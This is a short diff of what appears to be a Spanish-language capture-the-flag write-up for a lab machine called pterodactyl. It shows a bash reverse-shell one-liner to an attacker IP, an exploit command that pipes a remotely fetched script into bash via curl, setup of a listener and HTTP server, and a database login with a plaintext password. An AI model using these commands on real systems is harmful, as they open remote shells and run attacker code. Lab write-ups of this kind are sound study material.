@@ -37,6 +37,10 @@ En nuestra maquina atacante nos creamos un archivo `.sh` con un oneliner
 sh -i >& /dev/tcp/10.10.15.111/443 0>&1
 ```
 
+Nos abriremos un servidor con python `python3 -m http.server 8080`
+Y nos ponemos en escucha con penelope ``
+
+
 `python3 poc.py panel.pterodactyl.htb 'curl http://10.10.15.111:8080/onelines.sh | bash'`
 
 mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1
